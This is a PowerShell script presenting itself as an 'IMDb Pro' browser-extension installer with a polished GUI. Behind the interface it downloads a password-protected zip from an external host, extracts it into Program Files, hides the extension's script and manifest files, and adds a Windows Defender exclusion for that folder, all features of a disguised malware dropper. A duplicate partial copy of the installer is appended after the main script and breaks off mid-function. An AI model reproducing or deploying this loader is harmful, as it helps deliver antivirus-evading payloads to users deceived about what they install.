# IMDb Pro Installer - Fixed Temporary File Name
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Create main form with compact design
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(700, 600)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 20)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Compact Header Panel
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(700, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($headerPanel)

# Compact Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(160, 32)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
$contentPanel.Size = New-Object System.Drawing.Size(700, 450)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 25)
$mainForm.Controls.Add($contentPanel)

# Compact Features Section
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "✨ Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(25, 20)
$contentPanel.Controls.Add($featuresTitle)

# Compact Features Grid
$features = @(
    @{
        Title = "Real-time Ratings"
        Description = "Instant ratings access"
        Location = New-Object System.Drawing.Point(25, 60)
        Icon = "⭐"
    },
    @{
        Title = "Complete Movie Info" 
        Description = "Cast, crew & details"
        Location = New-Object System.Drawing.Point(255, 60)
        Icon = "🎬"
    },
    @{
        Title = "HD Trailers"
        Description = "Watch in browser"
        Location = New-Object System.Drawing.Point(485, 60)
        Icon = "📹"
    },
    @{
        Title = "Browser Integration"
        Description = "Seamless experience"
        Location = New-Object System.Drawing.Point(25, 180)
        Icon = "🌐"
    },
    @{
        Title = "Auto Updates"
        Description = "Always up-to-date"
        Location = New-Object System.Drawing.Point(255, 180)
        Icon = "🔄"
    },
    @{
        Title = "Secure & Private"
        Description = "Data protected"
        Location = New-Object System.Drawing.Point(485, 180)
        Icon = "🔒"
    }
)

foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(190, 90)
    $featurePanel.Location = $feature.Location
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    
    $featurePanel.Add_MouseEnter({
        $this.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
        $this.Cursor = [System.Windows.Forms.Cursors]::Hand
    })
    $featurePanel.Add_MouseLeave({
        $this.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    })
    
    $contentPanel.Controls.Add($featurePanel)
    
    $iconLabel = New-Object System.Windows.Forms.Label
    $iconLabel.Text = $feature.Icon
    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 16, [System.Drawing.FontStyle]::Bold)
    $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
    $iconLabel.AutoSize = $true
    $iconLabel.Location = New-Object System.Drawing.Point(15, 15)
    $featurePanel.Controls.Add($iconLabel)
    
    $title = New-Object System.Windows.Forms.Label
    $title.Text = $feature.Title
    $title.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $title.ForeColor = [System.Drawing.Color]::White
    $title.AutoSize = $true
    $title.Location = New-Object System.Drawing.Point(50, 15)
    $featurePanel.Controls.Add($title)
    
    $desc = New-Object System.Windows.Forms.Label
    $desc.Text = $feature.Description
    $desc.Font = New-Object System.Drawing.Font("Segoe UI", 8)
    $desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    $desc.AutoSize = $true
    $desc.Location = New-Object System.Drawing.Point(15, 55)
    $featurePanel.Controls.Add($desc)
}

# Progress Section
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "📊 Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(25, 290)
$contentPanel.Controls.Add($progressTitle)

$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(650, 80)
$progressContainer.Location = New-Object System.Drawing.Point(25, 330)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(15, 15)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(45, 17)
$progressContainer.Controls.Add($statusLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(15, 45)
$progressBar.Size = New-Object System.Drawing.Size(550, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
$progressContainer.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(575, 43)
$progressContainer.Controls.Add($percentLabel)

# Button Panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 530)
$buttonPanel.Size = New-Object System.Drawing.Size(700, 70)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($buttonPanel)

$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$installButton.Size = New-Object System.Drawing.Size(300, 40)
$installButton.Location = New-Object System.Drawing.Point(200, 15)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

$installButton.Add_MouseEnter({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
        $this.Size = New-Object System.Drawing.Size(310, 42)
        $this.Location = New-Object System.Drawing.Point(195, 14)
    }
})

$installButton.Add_MouseLeave({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Size = New-Object System.Drawing.Size(300, 40)
        $this.Location = New-Object System.Drawing.Point(200, 15)
    }
})

$buttonPanel.Controls.Add($installButton)

# Animation Functions
function Start-LoadingAnimation {
    param($DurationMs = 1000)
    
    $startTime = Get-Date
    $icons = @("⏳", "⌛", "⏳", "⌛")
    $colors = @(
        [System.Drawing.Color]::FromArgb(245, 197, 24),
        [System.Drawing.Color]::FromArgb(41, 182, 246),
        [System.Drawing.Color]::FromArgb(255, 152, 0),
        [System.Drawing.Color]::FromArgb(76, 175, 80)
    )
    
    while (((Get-Date) - $startTime).TotalMilliseconds -lt $DurationMs) {
        $index = [int]((((Get-Date) - $startTime).TotalMilliseconds / 250) % $icons.Length)
        $statusIcon.Text = $icons[$index]
        $statusIcon.ForeColor = $colors[$index]
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 50
    }
    
    $statusIcon.ForeColor = [System.Drawing.Color]::White
}

function Start-ProgressAnimation {
    param($From, $To, $DurationMs = 600)
    
    $startTime = Get-Date
    $current = $From
    
    while ($current -lt $To) {
        $elapsed = ((Get-Date) - $startTime).TotalMilliseconds
        $progress = [Math]::Min($elapsed / $DurationMs, 1.0)
        $current = $From + ($To - $From) * $progress
        
        $progressBar.Value = [int]$current
        $percentLabel.Text = "$([int]$current)%"
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 20
    }
    
    $progressBar.Value = $To
    $percentLabel.Text = "$To%"
}

function Start-CelebrationAnimation {
    $celebrateIcons = @("🎉", "🎊", "✨", "🌟", "🎈")
    for ($i = 0; $i -lt 10; $i++) {
        $iconIndex = $i % $celebrateIcons.Length
        $statusIcon.Text = $celebrateIcons[$iconIndex]
        $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256)
        )
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 150
    }
    $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
}

# Enhanced Update function with animations
function Update-Status {
    param(
        [string]$Message, 
        [int]$ProgressValue, 
        [string]$Icon = "📌",
        [switch]$Loading,
        [switch]$AnimateProgress
    )
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    
    if ($Loading) {
        Start-LoadingAnimation -DurationMs 800
    }
    
    if ($AnimateProgress -and $ProgressValue -ge 0) {
        Start-ProgressAnimation -From $progressBar.Value -To $ProgressValue -DurationMs 600
    } elseif ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
        $percentLabel.Text = "$ProgressValue%"
    }
    
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 400
}

# FIXED: Download function with correct file name
function Download-FileWithProgress {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    
    try {
        Write-Host "📥 Downloading from: $Url" -ForegroundColor Cyan
        Write-Host "📁 Saving to: $OutputPath" -ForegroundColor Cyan
        
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)
        
        # Verify download
        if (Test-Path $OutputPath) {
            $fileInfo = Get-Item $OutputPath
            Write-Host "✅ Download successful! Size: $($fileInfo.Length) bytes" -ForegroundColor Green
            return $true
        } else {
            Write-Host "❌ Download failed - file not created" -ForegroundColor Red
            return $false
        }
    }
    catch {
        Write-Host "❌ Download error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# FIXED: Enhanced extraction functions
function Test-7ZipAvailable {
    $locations = @(
        "7z",
        "7z.exe", 
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
    )
    
    foreach ($location in $locations) {
        if (Get-Command $location -ErrorAction SilentlyContinue) {
            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
            return $location
        }
        if (Test-Path $location) {
            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
            return $location
        }
    }
    Write-Host "❌ 7-Zip not found" -ForegroundColor Red
    return $null
}

function Extract-With7Zip {
    param($ZipFile, $Destination, $Password)
    
    $7zipPath = Test-7ZipAvailable
    if (-not $7zipPath) {
        return $false
    }
    
    Update-Status "Using 7-Zip for extraction..." 0 "📦"
    
    try {
        # Build 7-Zip arguments
        $arguments = @(
            "x",           # Extract
            "-p$Password", # Password
            "-o$Destination", # Output directory
            "-y",          # Yes to all
            $ZipFile       # Archive file
        )
        
        Write-Host "🔧 Executing: $7zipPath $($arguments -join ' ')" -ForegroundColor Cyan
        
        $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
        
        if ($process.ExitCode -eq 0) {
            Write-Host "✅ 7-Zip extraction successful!" -ForegroundColor Green
            return $true
        } else {
            Write-Host "❌ 7-Zip extraction failed with exit code: $($process.ExitCode)" -ForegroundColor Red
            return $false
        }
    }
    catch {
        Write-Host "❌ 7-Zip extraction error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Extract-WithDotNet {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Using .NET extraction method..." 0 "⚡"
    
    try {
        # Extract using .NET (may not work with password)
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
        Write-Host "✅ .NET extraction successful!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "❌ .NET extraction failed: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Extract-WithShellApplication {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Using Windows Shell extraction..." 0 "🖥️"
    
    try {
        $shell = New-Object -ComObject Shell.Application
        $zipFolder = $shell.NameSpace($ZipFile)
        $destFolder = $shell.NameSpace($Destination)
        
        if ($zipFolder -eq $null) {
            Write-Host "❌ Shell: Cannot open ZIP file" -ForegroundColor Red
            return $false
        }
        
        # Copy all items from ZIP to destination
        $destFolder.CopyHere($zipFolder.Items(), 0x14) # 0x14 = No progress UI + Yes to all
        
        # Wait for extraction to complete
        Start-Sleep -Seconds 3
        
        # Verify extraction
        $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
        
        if ($extractedFiles.Count -gt 0) {
            Write-Host "✅ Shell extraction successful! Extracted $($extractedFiles.Count) files" -ForegroundColor Green
            return $true
        } else {
            Write-Host "⚠️ Shell extraction completed but no files found" -ForegroundColor Yellow
            return $false
        }
    }
    catch {
        Write-Host "❌ Shell extraction error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# MAIN ENHANCED EXTRACTION FUNCTION
function Extract-ZipWithPassword {
    param(
        [string]$ZipFile,
        [string]$Destination,
        [string]$Password
    )
    
    Write-Host "`n🚀 Starting extraction process..." -ForegroundColor Cyan
    Write-Host "📦 ZIP File: $ZipFile" -ForegroundColor Gray
    Write-Host "📁 Destination: $Destination" -ForegroundColor Gray
    Write-Host "🔐 Password: $Password" -ForegroundColor Gray
    
    if (-not (Test-Path $ZipFile)) {
        Write-Host "❌ ZIP file not found: $ZipFile" -ForegroundColor Red
        return $false
    }
    
    # Verify ZIP file
    $fileInfo = Get-Item $ZipFile
    Write-Host "📊 ZIP file size: $($fileInfo.Length) bytes" -ForegroundColor Cyan
    
    # Ensure destination exists
    if (-not (Test-Path $Destination)) {
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        Write-Host "✅ Created destination directory: $Destination" -ForegroundColor Green
    }
    
    # Try multiple extraction methods
    $extractionMethods = @(
        @{ Name = "7-Zip"; Function = ${function:Extract-With7Zip} },
        @{ Name = "Windows Shell"; Function = ${function:Extract-WithShellApplication} },
        @{ Name = ".NET Framework"; Function = ${function:Extract-WithDotNet} }
    )
    
    foreach ($method in $extractionMethods) {
        Write-Host "`n🔄 Trying $($method.Name) extraction..." -ForegroundColor Yellow
        
        $success = & $method.Function -ZipFile $ZipFile -Destination $Destination -Password $Password
        
        if ($success) {
            Write-Host "✅ Extraction successful with $($method.Name)!" -ForegroundColor Green
            
            # Verify extraction
            $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
            if ($extractedFiles.Count -gt 0) {
                Write-Host "📁 Verified: $($extractedFiles.Count) files extracted" -ForegroundColor Green
                return $true
            } else {
                Write-Host "⚠️ Extraction reported success but no files found" -ForegroundColor Yellow
                continue
            }
        } else {
            Write-Host "❌ $($method.Name) extraction failed" -ForegroundColor Red
        }
    }
    
    Write-Host "`n💥 All extraction methods failed!" -ForegroundColor Red
    return $false
}

# Function to hide specific files
function Hide-Files {
    param([string]$FolderPath)
    
    $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
    
    Write-Host "`n🔒 Hiding sensitive files..." -ForegroundColor Cyan
    
    foreach ($file in $filesToHide) {
        $filePath = Join-Path $FolderPath $file
        if (Test-Path $filePath) {
            try {
                # Set file attributes to Hidden
                Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
                Write-Host "✅ Hidden: $file" -ForegroundColor Green
            }
            catch {
                Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "❌ File not found: $file" -ForegroundColor Red
        }
    }
}

# FIXED: Enhanced Installation function with correct file names
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    # FIXED: Correct temporary file name
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Clean up any existing temp files
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up existing temp file" -ForegroundColor Yellow
        }
        
        # Phase 1: Preparation
        Update-Status "Checking administrator privileges..." 10 "🔍" -Loading
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0 "❌"
            [System.Windows.Forms.MessageBox]::Show(
                "Please run this installer as Administrator.", 
                "Elevation Required", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Warning
            )
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        
        # Phase 2: Create directory
        Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
            Write-Host "✅ Created installation directory: $installPath" -ForegroundColor Green
        }
        
        # Phase 3: Download file
        Update-Status "Downloading IMDb Pro package..." 40 "📥" -Loading
        
        # Actual download with correct file name
        $downloadSuccess = Download-FileWithProgress -Url $downloadUrl -OutputPath $tempFile
        
        if (-not $downloadSuccess) {
            throw "Download failed - cannot continue without the package"
        }
        
        Update-Status "Download completed successfully!" 60 "✅" -AnimateProgress
        
        # Phase 4: Enhanced Extraction
        Update-Status "Starting extraction process..." 70 "🔐" -Loading
        
        # Extract using enhanced function
        $extractionSuccess = Extract-ZipWithPassword -ZipFile $tempFile -Destination $installPath -Password $zipPassword
        
        if (-not $extractionSuccess) {
            throw "All extraction methods failed. Please ensure 7-Zip is installed for password-protected ZIP files."
        }
        
        Update-Status "Extraction completed successfully!" 80 "✅" -AnimateProgress
        
        # Phase 5: Hide files
        Update-Status "Securing installation files..." 85 "🔒" -Loading
        Hide-Files -FolderPath $installPath
        
        # Phase 6: Final setup
        Update-Status "Finalizing installation..." 95 "🎯" -Loading
        
        # Cleanup temporary file
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up temporary file" -ForegroundColor Green
        }
        
        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
            Write-Host "🛡️ Added Windows Defender exclusion" -ForegroundColor Green
        }
        catch {
            Write-Host "⚠️ Windows Defender exclusion failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        # Success animation sequence
        for ($i = 96; $i -le 100; $i++) {
            Update-Status "Completing installation..." $i "✨"
            Start-Sleep -Milliseconds 60
        }
        
        Update-Status "Installation completed successfully!" 100 "✅"
        
        # Celebration animation
        Start-CelebrationAnimation
        
        # Final UI updates
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        # Show success message
        $result = [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "📍 Location: $installPath`n" +
            "📥 Downloaded from: $downloadUrl`n" +
            "🔐 Password used: $zipPassword`n" +
            "📁 Files extracted and secured`n" +
            "🔒 Specific files hidden for security`n`n" +
            "Would you like to open the installation folder now?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
        
    }
    catch {
        # Error animation
        for ($i = 0; $i -lt 3; $i++) {
            Update-Status "Installation failed!" 0 "💥"
            Start-Sleep -Milliseconds 200
            Update-Status "Installation failed!" 0 "❌"
            Start-Sleep -Milliseconds 200
        }
        
        Update-Status "Error: $($_.Exception.Message)" 0 "🚫"
        
        # Cleanup on error
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up temporary file after error" -ForegroundColor Yellow
        }
        
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`n" +
            "Troubleshooting steps:`n" +
            "• Check internet connection`n" +
            "• Verify administrator privileges`n" +
            "• Install 7-Zip for password extraction`n" +
            "• Check if password '123' is correct`n" +
            "• Verify URL is accessible: $downloadUrl`n" +
            "• Ensure sufficient disk space`n`n" +
            "Then try again.",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click event
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
# Log text box
 $logTextBox = New-Object System.Windows.Forms.TextBox
 $logTextBox.Multiline = $true
 $logTextBox.ScrollBars = "Vertical"
 $logTextBox.Location = New-Object System.Drawing.Point(50, 180)
 $logTextBox.Size = New-Object System.Drawing.Size(400, 120)
 $logTextBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 50)
 $logTextBox.ForeColor = [System.Drawing.Color]::White
 $logTextBox.Font = New-Object System.Drawing.Font("Consolas", 9)
 $logTextBox.ReadOnly = $true
 $mainForm.Controls.Add($logTextBox)

# Install button
 $installButton = New-Object System.Windows.Forms.Button
 $installButton.Text = "Install IMDb Pro"
 $installButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
 $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
 $installButton.ForeColor = [System.Drawing.Color]::Black
 $installButton.Size = New-Object System.Drawing.Size(150, 40)
 $installButton.Location = New-Object System.Drawing.Point(175, 320)
 $mainForm.Controls.Add($installButton)

# Function to update log
function Update-Log {
    param([string]$Message, [string]$Color = "White")
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    
    # Add to log textbox
    $logTextBox.AppendText("$logMessage`r`n")
    $logTextBox.SelectionStart = $logTextBox.TextLength
    $logTextBox.ScrollToCaret()
    
    # Also write to console for debugging
    switch ($Color) {
        "Green" { Write-Host $logMessage -ForegroundColor Green }
        "Yellow" { Write-Host $logMessage -ForegroundColor Yellow }
        "Red" { Write-Host $logMessage -ForegroundColor Red }
        "Cyan" { Write-Host $logMessage -ForegroundColor Cyan }
        default { Write-Host $logMessage }
    }
    
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to update status and progress
function Update-Status {
    param([string]$Status, [int]$Progress = -1)
    
    $statusLabel.Text = $Status
    if ($Progress -ge 0 -and $Progress -le 100) {
        $progressBar.Value = $Progress
    }
    
    [System.Windows.Forms.Application]::DoEvents()
}

# Function to download file with multiple methods
function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    
    Update-Log "Attempting to download from: $Url" "Cyan"
    
    # Method 1: WebClient
    try {
        Update-Log "Trying download with WebClient..." "Cyan"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.DownloadFile($Url, $OutputPath)
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "WebClient download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "WebClient download failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 2: Invoke-WebRequest
    try {
        Update-Log "Trying download with Invoke-WebRequest..." "Cyan"
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "Invoke-WebRequest download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "Invoke-WebRequest download failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 3: BitsTransfer
    try {
        Update-Log "Trying download with BitsTransfer..." "Cyan"
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $Url -Destination $OutputPath -Description "IMDb Pro Download"
        
        if (Test-Path $OutputPath) {
            $fileSize = (Get-Item $OutputPath).Length
            Update-Log "BitsTransfer download successful. Size: $fileSize bytes" "Green"
            return $true
        }
    }
    catch {
        Update-Log "BitsTransfer download failed: $($_.Exception.Message)" "Red"
    }
    
    Update-Log "All download methods failed" "Red"
    return $false
}

# Function to extract ZIP using multiple methods
function Extract-ZIP {
    param(
        [string]$ZipFile,
        [string]$Destination,
        [string]$Password
    )
    
    Update-Log "Attempting to extract: $ZipFile" "Cyan"
    Update-Log "Destination: $Destination" "Cyan"
    Update-Log "Password: $Password" "Cyan"
    
    # Ensure destination exists
    if (-not (Test-Path $Destination)) {
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        Update-Log "Created destination directory" "Green"
    }
    
    # Method 1: .NET ExtractToDirectory
    try {
        Update-Log "Trying extraction with .NET..." "Cyan"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
        
        $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
        Update-Log ".NET extraction successful. Extracted $extractedFiles files" "Green"
        return $true
    }
    catch {
        Update-Log ".NET extraction failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 2: Shell Application
    try {
        Update-Log "Trying extraction with Shell Application..." "Cyan"
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace((Resolve-Path $ZipFile).Path)
        $dest = $shell.NameSpace((Resolve-Path $Destination).Path)
        
        $dest.CopyHere($zip.Items(), 0x14) # 0x14 = No progress UI + Yes to all
        
        # Wait for extraction to complete
        Start-Sleep -Seconds 5
        
        $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
        if ($extractedFiles -gt 0) {
            Update-Log "Shell extraction successful. Extracted $extractedFiles files" "Green"
            return $true
        } else {
            Update-Log "Shell extraction completed but no files found" "Yellow"
        }
    }
    catch {
        Update-Log "Shell extraction failed: $($_.Exception.Message)" "Red"
    }
    
    # Method 3: 7-Zip if available
    $7zipPaths = @(
        "7z.exe",
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
    )
    
    foreach ($path in $7zipPaths) {
        if (Test-Path $path) {
            try {
                Update-Log "Trying extraction with 7-Zip ($path)..." "Cyan"
                
                $arguments = @(
                    "x",           # Extract
                    "-p$Password", # Password
                    "-o$Destination", # Output directory
                    "-y",          # Yes to all
                    $ZipFile       # Archive file
                )
                
                $process = Start-Process -FilePath $path -ArgumentList $arguments -Wait -PassThru -NoNewWindow
                
                if ($process.ExitCode -eq 0) {
                    $extractedFiles = Get-ChildItem $Destination -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
                    Update-Log "7-Zip extraction successful. Extracted $extractedFiles files" "Green"
                    return $true
                } else {
